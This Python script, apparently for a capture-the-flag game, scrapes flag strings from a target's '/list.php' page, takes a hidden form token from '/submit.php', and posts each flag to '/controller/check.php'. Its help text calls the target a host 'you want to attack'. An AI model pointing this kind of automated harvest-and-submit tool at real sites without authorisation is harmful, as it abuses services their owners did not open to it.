import requests
from bs4 import BeautifulSoup
import getopt
import sys

ip = ''
port = 0

# print(sys.argv[1:])

try:
    opts, args = getopt.getopt(sys.argv[1:],"ht:p:",["help","target=","port="])
except:
    print("Invalid option")
    exit(0)

for o,a in opts:
    # print(o)
    if o in ("-t","--target"):
        ip = a
    elif o in("-p","--port"):
        try:
            port = int(a)
            print(port)
            if port < 1 or port > 65535:
                print("Invalid port number")
                exit()
        except:
            print("Invalid port")
            exit()
    elif o in ("-h","--help"):
        print("Usage:")
        print("python attacker.py -t targetip -p portnumber")
        print("-t or --target : The ip of the target that you want to attack")
        print("-p or --port : The port number of the target that you want to attack")
        print("\npython attacker.py -h")
        print("-h or --help : print this menu")
        exit()
    
if port == 0 or ip == '':
    print("You must specify ip address and port number")
    exit()

session = requests.session()

customHeader = {"User-Agent" : "Chrome"}
webPageFlags = session.get("http://" + ip + ":" + str(port) + "/list.php",headers=customHeader)

bSoupFlags = BeautifulSoup(webPageFlags.text, 'html.parser')

allFlagContainers = bSoupFlags.findAll("div", {"class" : "border"})

arr = []

for x in allFlagContainers:
    arr.append(x.find("div").decode_contents().strip())

webPageSubmit = session.get("http://" + ip + ":" + str(port) + "/submit.php",headers=customHeader)
bSoupSubmit = BeautifulSoup(webPageSubmit.text, 'html.parser')

token = bSoupSubmit.find("input", {"type":"hidden"})
_tokenValue = token.get('value')

for x in arr:
    res = session.post("http://" + ip + ":" + str(port) + "/controller/check.php",data={
        "_token" : _tokenValue,
        "flag" : x
    },headers=customHeader)
    print(x,res.text)
    pass